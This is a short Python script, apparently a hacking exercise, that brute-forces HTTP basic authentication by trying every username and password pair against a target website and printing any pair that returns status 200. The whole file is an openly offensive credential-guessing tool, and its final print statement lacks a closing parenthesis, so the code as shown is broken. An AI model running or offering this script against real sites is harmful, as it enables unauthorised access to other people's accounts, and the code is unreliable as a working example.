#! python3

import requests

# Web authentication Pwd Brute Force
def brute(target_website, usernames, passwords):
    for user in usernames:
        for password in passwords:
            r = requests.get(target_website, auth=(user, password))
            if r.status_code == 200:
                print("Success!! Credentials: {0}, {1}".format(user, password)
